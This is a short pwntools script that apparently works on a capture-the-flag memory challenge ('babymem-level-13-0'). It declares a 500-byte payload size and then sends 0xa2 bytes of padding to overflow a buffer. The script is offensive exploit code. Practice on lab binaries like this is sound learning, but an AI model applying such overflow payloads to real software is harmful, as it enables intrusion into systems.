from pwn import *

p = process('/challenge/babymem-level-13-0')
p.recvuntil('Payload size:')
p.sendline(b'500')
payload = b'A' * 0xa2

#p.recvline('Send your payload')
p.send(payload)
p.interactive()
